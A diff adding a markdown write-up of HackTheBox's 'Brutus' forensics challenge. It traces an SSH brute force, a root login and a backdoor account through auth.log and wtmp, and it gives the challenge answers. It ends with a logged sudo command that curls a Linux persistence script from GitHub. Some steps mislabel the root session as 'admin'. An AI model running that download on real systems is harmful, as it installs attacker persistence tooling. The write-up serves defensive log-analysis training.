@@ -1,0 +1,110 @@
+---
+title: Brutus
+date: 2024-12-13 11:00:00 +/-TTTT
+categories: [DFIR]
+tags: [htb]     # TAG names should always be lowercase
+description: Brutus, very easy Sherlock on HackTheBox writeup
+---
+
+# Brutus
+
+## Scenario
+
+In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
+
+
+1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?
+
+
+Opening the logs we start looking for patterns, or rather deviating patterns. A brute force attack would have a lot of requests within a certain time span.
+From the start of the log till 06:31:01 we see a lot of sessions opening and closing. After that we see that there are multiple attempts to login as an invalid user: admin. We can see that the attacker is using a different port for each attempt.
+
+```
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
+---
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2330]: Invalid user admin from 65.2.161.68 port 46422
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: Invalid user admin from 65.2.161.68 port 46498
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2328]: Invalid user admin from 65.2.161.68 port 46390
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2335]: Invalid user admin from 65.2.161.68 port 46460
+
+etc.
+```
+
+`65.2.161.68`
+
+2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?
+
+Looking for the source IP of the attacker we can search for succesful login attempts. 
+
+
+```
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
+```
+
+`root`
+
+3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?
+
+In the zip file where two files: the _auth.log_ file, and also a wtmp file.
+We can _parse_ the contents of this file using _utmpdump_. Looking for login sessions of root of the day of the attack and combing this with the source IP of the attacker(which is information we found in the previous tasks), we can find the timestamp: 
+```
+[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
+```
+
+` 2024-03-06 06:32:45 `
+
+4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
+
+Looking through the logs we search for a succesful login of the _admin_ account. The catch is that the first time the admin user is logged in, its an automated login from the bruteforce attempt. The session gets killed shortly after.
+So instead we look for a session which stays open, and actions are carried out by the attacker.
+
+```
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
+```
+
+`37`
+
+5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+
+Shortly after logging in manually, we can see the attacker adding an user.
+
+```
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
+Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
+Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
+Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
+```
+
+ `cyberjunkie`
+
+6. What is the MITRE ATT&CK sub-technique ID used for persistence?
+
+Searching through the _persistance_ tactics we find that making a local account is in fact sub-technique ID _T1136.001_.
+
+![[Pasted image 20241213121544.png]]
+
+7. How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
+
+We know from the wmtp file that the first terminal session started at _06:32:45_.
+Before the user logs in with his new account he ends the session on the admin account at _06:37:24_:
+```
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
+Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
+Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
+```
+
+Subtract the later from the first and you'll find that the session lasted 4 minutes and 39 seconds of _279 seconds_.
+
+
+
+8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+
+Looking for an executed command as _cyberjunkie_ with _sudo_ we find the following entry in the auth.log:
+`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
+
